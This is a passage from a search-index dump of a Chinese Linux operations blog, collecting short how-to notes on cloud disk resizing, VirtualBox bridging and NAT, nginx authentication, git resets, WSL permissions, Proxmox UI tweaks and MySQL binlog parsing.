修改端点组1中的区域(区域对应的就是你需要加速的目标区域，比如我的是新加坡,这儿选择的就是新加坡ap-southeast-1)，其他配置默认即可。点击下一步。 添加端点： 点击添加端点, 修改端点类型，你后端是什么就选择什么，端点类型选择过后，端点会自动加载已有的资源信息，其他默认。 点击创建加速器 即完成创建。 加速器创建完成后会提供一个dns地址，将需要加速的域名直接解析上去即可。 AWS Global Accelerator的功能和cdn类似，但效果比cdn好, 费用肯定要更高一些了。他还可以实现端口转发等其他的功能，可以自行参悟。 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:56:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"阿里云磁盘分区扩容 https://help.aliyun.com/zh/ecs/user-guide/step-2-resize-partitions-and-file-systems/?spm=a2c4g.11186623.0.0.5a193a8aP9JIh1 # 确认分区信息 $\u003e sudo fdisk -lu # 扩容分区 ## 命令参数中的 /dev/vdb 和 1 之间需要空格分隔，1是分区编号, 是需要扩容的盘。 $\u003e type growpart || sudo yum install -y cloud-utils-growpart $\u003e sudo yum update cloud-utils-growpart $\u003e type sgdisk || sudo yum install -y gdisk $\u003e sudo LC_ALL=en_US.UTF-8 growpart /dev/vdb 1 # 扩容盘 ## xfs 扩容 , /mnt 是挂载的目录 $\u003e type xfs_growfs || sudo yum install -y xfsprogs $\u003e sudo xfs_growfs /mnt ## ext 扩容 $\u003e sudo resize2fs /dev/vdb1 ########################################## ## 裸盘扩容 $\u003e sudo resize2fs /dev/vdc ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:57:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"网络故障记录 症状：局域网机器网络故障，时好时坏。故障时候无法ping通网关(无法获取响应)，但可以ping通同网段的其他主机，也可以与其他主机正常通信。 原因：当前主机是通过手动配置ip，而局域网ip是路由自动分配的，有其他同事在连接时候占用了当前主机配置的ip，从而ip重复导致了上诉问题。 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:58:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"linux 桌面环境下，绑定指定唤起协议 例如 mailto:// 唤起指定的邮件应用,下面以he3的appimage程序为例 # 创建一个desktop文件(~/.local/share/applications) $\u003e vim ~/.local/share/applications/appimagekit-he3.desktop [Desktop Entry] Name=He3 Comment=He3 desktop X-AppImage-Version=5.0.4 Exec=/opt/tools/he3/he3.appImage %U Icon=/opt/tools/he3/he3.png Terminal=false Type=Application Categories=Application;Development; StartupNotify=true # 主要是这个 MimeType, he3 即为相关协议(浏览器请求 he3:// 打开此程序) MimeType=x-scheme-handler/he3; # 绑定协议到指定的应用上 $\u003e xdg-mime default appimagekit-he3.desktop x-scheme-handler/he3 # 查询已绑定的信息 $\u003e xdg-mime query default x-scheme-handler/he3 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:59:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"解决 Virtualbox 仅主机模式无法定制IP网段的问题(仅主机模式无法连接公网的问题) 此方案只适合linux桌面系统，windows理论可参考设定 # 创建一个虚拟网桥 $\u003e sudo brctl addbr br-vbox0 # sudo ip link add name br-vbox0 type bridge # 启用网桥和物理网卡 $\u003e sudo ip link set dev br-vbox0 up # 为网桥设置IP地址(这个ip相当于这个网段的路由) $\u003e sudo ip addr add 172.31.10.1/24 dev br-vbox0 # Virtualbox 创建虚拟机时候，网卡的连接方式改为桥连网卡, 然后选择创建的网桥 br-vbox0 即可(没有dhcp，需要自己手动配置服务器上的网卡信息) ## 以上步骤完成，那么配置的虚拟机网络即为仅主机模式，且可以自定义网段 ### 构建一个systemd管理脚本 $\u003e sudo vi /etc/systemd/system/create-bridge@.service [Unit] Description=Create bridge br-vbox%i After=network.target [Service] Type=oneshot ExecStart=/usr/sbin/brctl addbr br-vbox%i ExecStart=/usr/sbin/ip link set dev br-vbox%i up ExecStart=/usr/sbin/ip addr add 172.31.1%i.1/24 dev br-vbox%i ExecStop=/usr/sbin/ip link set dev br-vbox%i down ExecStop=/usr/sbin/brctl delbr br-vbox%i RemainAfterExit=yes [Install] WantedBy=multi-user.target $\u003e sudo systemctl daemon-reload # $\u003e sudo systemctl \u003cstart|stop|status\u003e create-bridge@0.service ### ## 开始设置该模式下的主机可连接公网 ## 需要iptables支持，创建步骤和 https://blog.0x5c0f.cc/2019/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/#linux-%E4%B8%8B%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E4%B8%8A%E5%85%AC%E7%BD%91 一致 # 物理机执行 # 允许NAT功能和网络包的转发(wlp0s20f3 为可以连接公网的网卡) $\u003e sudo iptables -t nat -A POSTROUTING -o wlp0s20f3 -j MASQUERADE # 允许从内网到公网的数据包转发 $\u003e sudo iptables -A FORWARD -i br-vbox0 -o wlp0s20f3 -j ACCEPT # 允许已经建立连接的流量转发 $\u003e sudo iptables -A FORWARD -i wlp0s20f3 -o br-vbox0 -m state --state RELATED,ESTABLISHED -j ACCEPT ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:60:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"grafana 查询错误 [A] got error: input data must be a wide series but got type long (input refid) 这个问题是在配置grafana警报规则时出现的，实际上这儿添加的是表达式，而不是查询标签，统计出来的结果只能是数字(看看prometheus的graph面板 ) ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:61:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"通过yum安装的mysql进行升级的时候报错 xxx file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql 这个错误多数出现在yum安装 mysql5.6、5.7 时 问题: warning: /var/cache/yum/x86_64/7/mysql57-community/packages/mysql-community-libs-5.7.44-1.el7.x86_64.rpm: Header V4 RSA/SHA256 Signature, key ID 3a79bd29: NOKEY Retrieving key from file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql The GPG keys listed for the \"MySQL 5.7 Community Server\" repository are already installed but they are not correct for this package. Check that the correct key URLs are configured for this repository. Failing package is: mysql-community-libs-5.7.44-1.el7.x86_64 GPG Keys are configured as: file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql 解决: # 不行就删掉原来的GPG 密钥，在重新导入 $\u003e rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:62:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"nginx配置特定方法请求时进行密码认证 # location auth_basic \"Registry realm\"; # 指定除 HEAD 和 OPTIONS 方法外，其他方法都需要进行用户名/密码认证 # 注意： 此项设置在 docker registry 反向代理中可能不太适用，docker 在push的时候会先进行GET，如果GET没有要求认证 # 则 docker 在push的时候就会不在携带用户名/密码校验，从而导致推送失败 limit_except HEAD OPTIONS { auth_basic_user_file conf.d/.htpasswd; } ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:63:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"服务器资源不够导致的问题 由于服务器上的php站点经常受到攻击，于是决定重新调整环境架构，给上个开源waf，部署一切正常，但是在站点正式运行的时，某个站点在访问一个查询页面时候，数据库的cpu使用率消耗疯狂上涨(几百倍)，开始以为是站点被传木马了，一直疯狂查代码，查了很久发现，结果是服务器资源不够，停了一些站点重新分配了下每个容器的资源使用后，目前看起来稳定了，2核8G内存跑了近60个php站点，不知道这是个什么水准的服务器，还是我太水优化不了😂😂😂。 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:64:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"通过systemd服务配置文件修改进程优先级 在[Service] 下添加 Nice=-10。 Nice 进程优先级，-20-19, 数字越小，优先级越高。 还可以直接修改已启动的进程的优先级 sudo renice -n -10 -p \u003cpid\u003e。可以通过sudo nice -n -10 \u003ccommand\u003e 直接在启动时指定 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:65:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"git 删除最近几次提交记录 # 重置到指定提交 $\u003e git reset --hard \u003ccommit id\u003e # 重新提交当前修改内容 并提交 $\u003e git add . \u0026\u0026 git comm -m '\u003cmessage\u003e' # 强制重新推送到远程仓库 $\u003e git push --force origin main # 如果报错，原因可能就是 远程仓库禁止 强制推送 # 错误：无法推送一些引用到 xxxxxxxxx # 报错要修改就只能开分支然后在推送，最后其申请合并 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:66:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(一)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","运维记事"],"content":"那些杂七杂八的记录(二)","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","运维记事"],"content":"debian 12 下 ROOTN 用户，无法设置中文问题 具体体现是，系统无论如何设置，终端变量始终为 LANG=C 和 LANGUAGE=C, 检查了所有设置，最后发现在~/.profile中，设置了这两个变量，不知道为什么要这样干，删了重载下就可以了 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/:1:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","运维记事"],"content":"debian 系统下， vim 打开文件后鼠标选择为可视模式问题 全局修改: 编辑 /usr/share/vim/vim82/defaults.vim , 大概在 80 行: if has('mouse') 下，将 set mouse=a 改为 set mouse= 即可 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/:2:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","运维记事"],"content":"nginx 添加 ssl 证书后 ， 浏览器仍然提示 不安全(你与此网站之间建立的连接并非完全安全) 多数是因为混合内容，在网站页面文件中,包含了其他网站非https的资源 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/:3:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","运维记事"],"content":"共享一个我自己用的 Bash Prompt # ~/.bashrc # need expand scripts: add https://github.com/git/git/blob/master/contrib/completion/git-prompt.sh to profile.d _PS1_CMD_=\"\\${VIRTUAL_ENV_PROMPT}\\\\\\\\[\\\\\\\\][\\\\[\\$(tput sgr0)\\\\]\\\\[\\\\033[38;5;5m\\\\]\\\\u\\\\[\\$(tput sgr0)\\\\]@\\\\[\\$(tput sgr0)\\\\]\\\\[\\\\033[38;5;70m\\\\]\\\\h\\\\[\\$(tput sgr0)\\\\] \\\\W]\\\\[\\$(tput sgr0)\\\\]\\\\[\\\\033[38;5;77m\\\\]\\${__GIT_BRANCH__}\\\\[\\\\033[38;5;9m\\\\][\\\\\\$?]\\\\[\\$(tput sgr0)\\\\]\\\\\\\\\\$ \\\\[\\$(tput sgr0)\\\\]\" export PROMPT_COMMAND=\"${PROMPT_COMMAND}; __GIT_BRANCH__=\\\"\\$(__git_ps1 '(%s)')\\\"; PS1=\\\"${_PS1_CMD_}\\\"\" # export PS1=\"[\\[$(tput sgr0)\\]\\[\\033[38;5;5m\\]\\u\\[$(tput sgr0)\\]@\\[$(tput sgr0)\\]\\[\\033[38;5;70m\\]\\h\\[$(tput sgr0)\\] \\W]\\[$(tput sgr0)\\]\\[\\033[38;5;9m\\][\\$?]\\[$(tput sgr0)\\]\\\\$ \\[$(tput sgr0)\\]\" ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/:4:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","运维记事"],"content":"windows 系统中代理设置问题 系统设置中, 默认代理设置使用的是 http 模式，如果想要使用 socks模式，则在地址栏输入 socks=\u003cproxy_ip\u003e，端口为socks端口即可(socks模式仅在win11上进行测试，其他系统参考执行) ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/:5:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","运维记事"],"content":"windows 挂载 sshfs 方法 本方案看到别人成功过，但自己没有测试成功 安装以下内容, 打开 sshfs-win-manager 正常配置挂载: https://github.com/winfsp/winfsp https://github.com/winfsp/sshfs-win https://github.com/evsar3/sshfs-win-manager ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/:6:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","运维记事"],"content":"Proxmox VE 中使用 Cloud 系统镜像快速创建虚拟机 https://www.truenasscale.com/2022/05/24/1117.html https://fairysen.com/742.html#toc-head-6 创建虚拟机, 操作系统设置，选择 不使用任何介质 系统 设置将 SCSI控制器 调整为 VirtIO SCSI, 机器可以设置为q35也可以默认 磁盘 设置删除掉所有的默认即可, 最后完成创建 完成创建后, 登陆到 PVE 主机上面，使用命令qm importdisk 100 aliyun_3_x64_20G_nocloud_alibase_20240528.qcow2 local-lvm 将 qcow2 导入到虚拟机中，100为虚拟机的VM ID, local-lvm是要存储的位置， 没有 qm 命令，安装下 cloud-init 软件包 导入完成后， 在硬件里面可以看到一个 未使用的磁盘0, 然后双击编辑, 一般默认即可(总线/设备调整为SCSI) 在 选项 中，选择 引导顺序，将添加的那块磁盘设为第一启动项 在 Cloud-init 中，设置下 用户名 / 密码 启动虚拟机 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/:7:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","运维记事"],"content":"Virtualbox 中使用 Cloud 系统镜像快速创建虚拟机 以Alibaba Cloud Linux 3云镜像为例，下载aliyun_3_x64_20G_nocloud_alibase_20240528.vhd 和 seed.img, seed.img是 cloud-init 数据源，可以自己创建参考官方文档或者阿里云文档的生成示例。 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/:8:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","运维记事"],"content":"虚拟机创建和配置 新建虚拟机， 虚拟机光盘无需指定，类型和版本按照自己使用的云镜像指定，然后一直下一步, 虚拟硬盘选择不添加虚拟硬盘， 然后点击下一步， 直到完成创建。 完成创建后, 右键创建好的虚拟机，选择设置， 理论上所有设置都可以使用默认值， 只需要更改一个地方。 选择 存储，选择控制器: IDE，右键添加cloud-init源, 就是下载的那个seed.img或者自己创建的(需要先注册到Virtualbox，这个步骤在测试时候发现不做似乎没什么影响，只是进去后使用的是下载镜像默认的帐号名密码，Alibaba Cloud Linux 3的是alinux:aliyun,这个在阿里云文档中手动生成配置文件中可以看到)。 选择 存储 , 选择 控制器: SATA, 在右侧设置中将型号改为virtio-scsi(这个步骤是必须的), 然后右键添加硬盘, 选择下载的aliyun_3_x64_20G_nocloud_alibase_20240528.vhd(同样需要先注册到Virtualbox)。 选择 网络，连接方式根据自己情况调整，高级中控制芯片修改为 准虚拟化网络(virtio-net), 然后确定修改。 最后正常启动虚拟机即可(注意： 第一次启动可能会比较慢，多等待一些时间就可以了， 启动后注意先配置好网络). ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/:8:1","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","运维记事"],"content":"PVE 添加额外菜单-监控组件 // 当前测试版本为 8.2.2 // 修改Web界面源代码 /usr/share/pve-manager/js/pvemanagerlib.js(注意备份) // 搜索到内容 `if (caps.nodes['Sys.Audit']) {`，大概在 43869 行, 注意搜索结果会有多个。 // 可以将前端界面修改为英文，然后随便改一个 gettext 内的内容刷新，看是否找对位置。 // 添加菜单，完整内容如下 if (caps.nodes['Sys.Audit']) { me.items.push( { xtype: 'pveNodeSummary', title: gettext('Summary'), iconCls: 'fa fa-book', itemId: 'summary', }, { xtype: 'pmxNotesView', title: gettext('Notes'), iconCls: 'fa fa-sticky-note-o', itemId: 'notes', }, /// 添加内容开始 { xtype: 'prometheusMonitorView', title: 'Prometheus 监控', iconCls: 'fa fa-line-chart', itemId: 'note-prometheus', } /// 添加内容结束 ); } /// 在文件最末尾添加 Ext.define('PVE.node.PrometheusMonitor', { extend: 'Ext.panel.Panel', alias: 'widget.prometheusMonitorView', scrollable: true, bodyPadding: 5, initComponent: function() { var me = this; var prometheusIframe = { xtype: 'component', autoEl: { tag: 'iframe', style: 'height: 100%; width: 100%; border: none;', src: 'https://sogou.com', frameborder: 0, scrolling: 'auto' } }; Ext.apply(me, { layout: 'fit', items: [prometheusIframe] }); me.callParent(); } }); ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/:9:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","运维记事"],"content":"binlog 解析工具 https://github.com/zhuchao941/canal2sql # 常用参数 ## -sql_type: 只解析指定类型，支持 insert,update,delete,ddl。多个类型用逗号隔开，如--sql-type=insert,delete。可选。默认为insert,update,delete,ddl ## -filter: 白名单,指定导出，多个逗号隔开 \u003c库名\u003e.\u003c表名\u003e(db.*、*.*) ## -mode: online/file/aliyun，默认online ## --file_url: 离线的binlog文件，支持http url访问 ## -B: 显示回滚sql ## ... # 1. 在线模式, 解析账户权限需要 SELECT, REPLICATION SLAVE, REPLICATION CLIENT $\u003e java -jar canal2sql-1.1.3.jar -sql_type update,delete -filter \u003cdatabase\u003e.\u003ctables\u003e -mode file -file_url 'file:/tmp/mysql-bin.000016' -uroot -P3306 -pxxxxx -hlocalhost # 2. 离线模式 ## 导出数据库标结构 $\u003e mysqldump -uroot -pxxxxx -hlocalhost --set-gtid-purged=OFF --default-character-set=utf8mb4 --single-transaction -R -E -B -d \u003cdatabase\u003e \u003e /tmp/database.sql ## $\u003e java -jar ./canal2sql-1.1.3.jar -mode file -ddl '/tmp/database.sql' -file_url 'http://localhost:8080/binlog/mysql-bin.000474' ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/:10:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","运维记事"],"content":"亚马逊云 EC2 Windows (2022) 安装 WSL 问题 注意: 虚拟化的EC2 Windows实例只支持WSL 1 https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/install-wsl-on-ec2-windows-instance.html ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/:11:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","运维记事"],"content":"远程登陆 windows openssh 服务后， 无法执行 wsl 命令启动子系统 The file cannot be accessed by the system 使用绝对路径打开 \"C:\\Program Files\\WSL\\wsl.exe\" ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/:12:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","运维记事"],"content":"WSL 子系统挂载权限问题 windows盘符默认挂载到/mnt目录下，且权限为777, 这不仅不方便，也有一些安全问题 解决: 创建或者修改文件/etc/wsl.conf文件,添加以下内容 [automount] enabled = true root = /mnt/ options = \"metadata,dmask=022,fmask=133\" mountFsTab = false 如果这样创建文件仍然是777, 可以在/etc/profile中添加一些umask设定 if [[ \"$(umask)\" == '000' ]]; then umask 022 fi 重启 wsl --shutdown , 然后重启登陆， 不行就重启下系统 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/:13:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","运维记事"],"content":"Wazhu agent 激活变量参考 https://documentation.wazuh.com/current/user-manual/agent/agent-enrollment/deployment-variables/deployment-variables-linux.html ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/:14:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","运维记事"],"content":"跨 VPC 访问 Redis 主备，info replication 拿到的从库ip是 内网ip 这个问题初次发现是应用调用华为的云Redis发现的，云Redis是跨vpc部署的主备， 但是info replication 拿到的从库ip是内网ip，由于应用和redis实际环境不处于同一网络，导致应用访问超时，目前的解决是研发这边准备重写对应组件，但发现该组件作者已经解决了这个问题，升级到新版本后解决。 架构可以看成是 用户: 192.168.2.8/24 访问 代理:192.168.2.10/24 —\u003e Redis主: 10.0.2.10/24, 而 用户通过 info replication 拿到的却是 10.0.2.10/24，所以 192.168.2.8/24 肯定无法连接 10.0.2.10/24。 这个问题感觉还是比较经典的，比如 用容器部署的主备，应用和主备环境不处于同一主机， 也会出现类似问题。应该是容器化部署类的都会产生，架构方面应该可以解决，但是没有找到合适的解决方案。 ","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/:15:0","tags":["linux","解决方案"],"title":"那些杂七杂八的记录(二)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","运维记事"],"content":"docker pull 超时问题 正常来说，此类问题应该通过 registry-mirrors 项配置镜像加速地址解决，但是现在这个镜像加速器能用的越来越少了，今天发现了一个新的方案，通过设置 http_proxy 